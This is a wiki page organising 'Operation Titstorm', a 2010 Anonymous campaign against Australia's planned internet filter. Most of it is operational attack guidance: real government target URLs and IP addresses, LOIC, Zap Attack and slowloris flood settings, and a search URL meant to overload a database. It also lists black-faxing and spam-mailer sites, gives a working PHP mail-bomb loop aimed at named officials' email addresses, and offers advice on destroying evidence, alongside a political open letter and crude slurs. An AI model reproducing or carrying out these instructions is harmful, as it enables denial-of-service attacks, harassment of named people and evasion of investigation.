[[Image:Ausfagposter.jpg||thumbleft|400px]]{{notice|'''Australia fags - [[Australia]] [[IRL]]''' <br />There's going to be an in real life protest February 20th, [http://encyclopediadramatica.com/Operation_Titstorm_IRL click here for more info] or join [irc://irc.anonnet.org/projectfreeweb irc.anonnet.org #projectfreeweb]}}This is your one-stop-only for helping the operation. <br />If you DO manage to mess it out or want to become more involved go to IRC Channel [irc://irc.anonnet.org/projectfreeweb irc.anonnet.org #projectfreeweb]<br /> The fallback position is on anonymunculeIRC at [irc://irc.anonymuncule.com/titstorm irc.anonymuncule.com #titstorm]. <br />Make sure to search this article before asking in the IRC to avoid common questions. Once in the IRC feel free to ask, anons will help you figure it out.

== Basic information ==
*The [[Operation Titstorm]] article will get you briefed.
*[http://mirror.wikileaks.info/wiki/leak/acma-secret-blacklist-18-mar-2009.txt Click here for a list of the websites that the ACMA (Australian Communications and Media Authority) intends to ban. It's believed to be current as of March 2009.]
::*[[ACMA/Full_List|In addition, Encyclopedia Dramatica keeps copies of the lists and tracks their version histories. Click here to view.]]
*Moar information and resource can be reached also here http://www.partyvan.info/wiki/Operation_Titstorm or here [http://74.125.155.132/search?q=cache%3Ahttp%3A%2F%2Fpartyvan.info%2Fwiki%2FOperation_Titstorm if the website is down]
*Remember, the front-line command-center is [irc://irc.anonnet.org/projectfreeweb irc.anonnet.org #projectfreeweb] and if this IRC address doesn't work, please try  [irc://irc.anonymuncule.com/titstorm irc.anonymuncule.com #titstorm]
* If you have haxing experience (SQL injection, remote shell,reverse engineering, XSS etc.) join [irc://irc.anonnet.org/titstormh4x irc.anonnet.org #titstormh4x]

*The squad Captain is Tootoot222, his principal lieutenants are Mitch, Alter, and Mooncup. Other guys running the show are Moose and Trixx. <s>[[User:MercWithMouth|MercWithMouth]]</s>(got de-opped and left), [[User:Infinite|Infinite]], <s>G0dfather</s>(scrap that, he was a troll), church0fscientology, and [[ODB]] of Encyclopedia Dramatica are also at hand, representing ED and keeping in contact with the media.

== How To Help ==
=== Create buzz ===
*Dig this http://digg.com/politics/Say_Yes_To_Small_Boobs
*Reddit this http://www.reddit.com/r/reddit.com/comments/b1jl7/operation_titstorm_say_yes_to_small_boobs/
*If you know or are a journalist, reporter or any other media related person, publish an article about this.
*If you have a blog, also do it faggot. Make buzz in facebak and in twitter.
*When you promote this, forget the /b/tard talk and shit and speak like a normal person, or else you will get no serious attention at all.

=== DDoSing ===
'''When DDoSing, DO NOT USE A PROXY''' Since you will DDoS the proxy, not the targeted server.
====PRIMARY DDoS TARGETS====
*http://www.aph.gov.au/ IP: 164.75.16.230
*http://www.minister.dbcde.gov.au IP: 203.9.222.73
==== Browser DDoSing ====
#Set the url to: [http://www.suasua.com/process.php?url=http://www.minister.dbcde.gov.au/&#038;refresh=.01] http://www.suasua.com/process.php?url=http://www.minister.dbcde.gov.au/&#038;refresh=.01
#Copypaste it in mutiple windows and visit it.
#???
#PROFIT!
==== Mac OS X ====
#Download Zap Attack from here: http://www.cowfight.com/cf4/zapattack/zapattack21.sit
#Uncompress it with [http://www.stuffit.com/mac/expander.html Stuff it Expander]
#After uncompressing it open ZapAttack from the folder that got created, Intel macs will get prompted to install rosetta, do it. 
#Then from File menu, choose Mass Connector.
#The settings are the following:
##Set IP to the primary targets in this article (or check the IRC Channel). Else: 164.75.16.230
##Set port to: 80
##Sockets: 100
##Stop at: 0
##Stay open for: 2 secs
##Connect every: 4 secs
#FIRE LAZORDS!!
Or, if your really want to use LOIC for some reason, here is how,
## install an app called winebottler from here http://winebottler.kronenberg.org/
## download the LOIC.exe file
## open the LOIC.exe file with winebottler
## choose the option, open directly dont bother trying to make an app bundle it doesnt work.
## Set LOIC up the same as the windows guys.
## Fire LAZORDS!!! 
That's all. Thanks for supporting La Resistance.

==== Windows ====
#Download LOIC from http://sourceforge.net/projects/loic/ <br>IMPORTANT: Only download it from sourceforge; NEVER DOWNLOAD IT FROM ANY OTHER LINK OR SITE.
#Uncompress it and open
#Set target to the primary targets in this article (or check the IRC Channel [irc://irc.anonnet.org/titstorm #titstorm]). Else: 164.75.16.230.
#Click Lock on.
#Leave Timeout at 9001, Set it to "not wait for reply".
#Leave port at 80, use TCP, set threads to 1000 or more
#FIRE LAZARS!!

==== Linux ====
#<s>Download http://sourceforge.net/projects/pyloris/ <code>python pyloris.py -l --socksversion  5 --socksport 9050 website.com</code> IMPORTANT: Make sure you have TOR installed! This method bypasses normal slowloris blocks! "Utilizing TOR should essentially eliminate the mitigating effects of ipchains, mod_antiloris, and mod_noloris."</s> - STOP DDoSING THROUGH Tor YOU FAGGOTS. it just makes the entire Tor network slow, and does not have much effect on the target.
#As of ~6:30am Feb 12, Aussie time, www.minister.dbcde.gov.au is now mostly fortified against slowloris.

==== Moar info on DDoS ====
Also you can consult the Encyclopedia Dramatica article for additional general or specific information on how DDoS can help with Operation:Titstorm, the article is here. [[Denial_of_Service]].

==== Regarding Possible Australian Counter-Measures ====
*Windows: If you get a request to look at your computer, then just shred the binary with this program: [http://www.cylog.org/utilities/cybershredder.jsp] http://www.cylog.org/utilities/cybershredder.jsp
*Mac OS X: Use [http://www.obdev.at/products/littlesnitch/index.html the Little Snitch] app [http://isohunt.com/torrent_details/137102749/little+snitch?tab=summary here] to deny weird access calls.
*Linux: You should already have shred installed but [http://wipe.sourceforge.net/ wipe] is another option. Need to [http://www.freesoftwaremagazine.com/columns/shred_and_secure_delete_tools_wiping_files_partitions_and_disks_gnu_linux turn off journaling] for a second for it to work.

====Other sites to hit====
*http://www.minister.dbcde.gov.au/
*http://www.immi.gov.au/ ( http://www.immi.gov.au/search/search.cgi?query=a&collection=dima-meta&form=simple&num_ranks=9001 <--- rapes their SQL and BandWidth)
*http://www.austrade.gov.au/

===Performing Blackfaxing or E-Mail spamming===

==== E-Mail Spamming ====
#Go to http://10minutemail.com/ and get a disposable email.
#Then use one of the following to send all the smalltit porn you have (or even just massive amounts of spam if you don't have the porn).
*PHP MAILER #1 > http://www.heavenlycakesandmore.com/xm.php
*PHP MAILER #2 > http://cosmositsolutions.com/xm.php
*PHP MAILER #3 > http://www.alastrianlampoon.com/xm.php
*MAILER SAUCE > http://www.heavenlycakesandmore.com/xm.txt

You can also use http://www.sendanonymousemail.net/ but you can't attach images.

==== Black Faxing ====
*Download this document: http://www.mediafire.com/?m25jkltmghm (open office works fine so UNIXoperatives can open it too)
:*Send that document via: http://www.freepopfax.com/
*Faxzero blankfax (3 pages of black - because that's the limit): http://rapidshare.com/files/348916003/anon.docx.html or http://www.mediafire.com/download.php?jzxiiz4zo34
:*Send via: http://www.faxzero.com/ (use a 10minutemail for verification)
If you get a 403 or 404 message for any of these sites, reset your IP and try again.

==== How to bomb their Emails ====
An Addendum By: <s>FarBeyondDriven8</s>Anonymous.
#Go to http://www.000webhost.com/order.php?aggree=yes Since they allow sendmail() for free, and they hired idiots to program their setupid forms. 
#Sign up for a free account on 000webhost.com
#Enter in all fake information, all you will need is to rememeber your password. There is no need for a real e-mail because they do not send conformation links.
#After you sign up, allow the Account Setup to build. It won't take long. 
#Go to the root directory of your file manager, create a PHP File with our bombing script in it. 
#Press "Enter Control Panel"
#Scroll down to "Files" select "File Manager" 
#Click "public.html"
#Now click "New File"
#An empty box with the words "Enter code here" should appear. 
#Enter the following:
<code><nowiki>
<?php set_time_limit(0); $emails = explode(', ', 'actman@fedcourt.gov.au, nswdr@fedcourt.gov.au, ntreg@fedcourt.gov.au, query@fedcourt.gov.au, qldreg@fedcourt.gov.au, sareg@fedcourt.gov.au, tasreg@fedcourt.gov.au, vicreg@fedcourt.gov.au, waregistry@fedcourt.gov.au, query@fedcourt.gov.au, alan.thompson@aph.gov.au, david.kenny@aph.gov.au, roxanne.missingham@aph.gov.au, judith.konig@aph.gov.au, Therese.Lynch@aph.gov.au, liz.bryant@aph.gov.au, nola.adcock@aph.gov.au, judy.hutchinson@aph.gov.au, terry.crane@aph.gov.au, bronwyn.graham@aph.gov.au, jane.romeyn@aph.gov.au, sheila.grant@acma.gov.au, chris.chapman@acma.gov.au, chris.chea@acma.gov.au, maureen.cahill@acma.gov.au, andrew.kerans@acma.gov.au, mark.loney@acma.gov.au, allan.major@acma.gov.au, olya.booyar@acma.gov.au, jonquil.ritter@acma.gov.au, kath.silleri@acma.gov.au, grant.symons@acma.gov.au, dianne.carlos@acma.gov.au, derek.ambrose@acma.gov.au, louise.harkness@acma.gov.au, paul.white@acma.gov.au, andree.wright@acma.gov.au, linda.caruso@acma.gov.au giles.tanner@acma.gov.au, mark.bidwell@acma.gov.au, david.brunfield@acma.gov.au, Brendan.Byrne@acma.gov.au, clare.oreilly@acma.gov.au, lais@acma.gov.au, SmartNumbers@acma.gov.au, antispamenquiries@acma.gov.au'); while(1) { foreach($emails as $e) { mail($e, "*CHANGEME*subject*CHANGEME*", "*CHANGEME*message*CHANGEME*", "*CHANGEME*From Email can be fake*CHANGEME*"); } } ?> 
</nowiki></code>

#Modify the addresses if necessary.
#Name it index.php. It will create an infinite loop of emails to send to your victim. 
#Click the Save icon at the top.
#Click the Back button, next to the Save icon.
#The script will then execute. 

It is more than likely 000webhost will suspend your account for this action. But who cares? Now the victim has a MASSIVE ammount of mail to look forward too.. and you can always sign up for another one.

Cyber attacks against Australia 'will continue'

Media contact information is being gathered so that we may spread the story around, a draft of this list can be found at http://etherpad.com/3cFQp2oB3e and will be transferred to here after it is finalized. All are welcomed to add newspapers and TV shows to the list.

== Letter to the government ==

'''Open letter concerning Australian Internet Censorship.'''
''To whom it may concern, and for the unaware public.''

Do not be confused about the intentions behind our attacks on various Australian government websites. Various media have falsely reported that our efforts are in defence of pornography. This is not about pornography. This is about freedom. The fact remains that under this proposed Internet censorship scheme over time the freedoms of Australians will continue to be eroded, all in the name of saving us from a threat that exists only in the minds of a vocal and very uninformed minority who wish to impose their morals and values on the public at large. We are in no way encouraging child pornography; however other courses of action should be encouraged, for Australia's "Cyber Safety Plan" creates problems in itself.

The fact is that "banned" content can be posted on ANY website, at any time; introducing these tools is only a way to silence the selected few. Once the tools are put into place, they can and will be abused, as it has happened throughout history. Costs to taxpayers are estimated to be $44.2 million. This money could be put to far better use. Furthermore, the creation of such an announced filter is in direct violation of the Universal Declaration of Human Rights Charter of 1948, Article 19; which states: "Everyone has the right of opinion and expression; this right includes freedom to hold opinions without interference and to seek, receive and impart information and ideas through any media and regardless of frontiers."

No democratic government should ever favour one community's views over others, be it religious, political or otherwise; it is discriminatory toward minority groups. This censorship has been nothing more than a modern day prohibition and attack against freedoms that the Australian populace previously enjoyed.

We will not back down until this illicit censorship has been removed; the freedoms and rights of the Australian public must be restored. Further attacks will continue on a much larger scale in a wide variety of forms. Attempts to stop us will only bring more negative publicity to this internet censorship campaign and make the Australian government look disgraceful in the eyes of the international public.

===Other Targets===
Since the ban on female ejaculation is incredibly sexist, a letter writing campaign to Australian wimmens' organizations [[:File:Titstorm_2010-02-10_at_7.41.13_PM.png|is underway]].
A list of such orgs can be found [http://www.nwjc.org.au/womensorgs.html here].
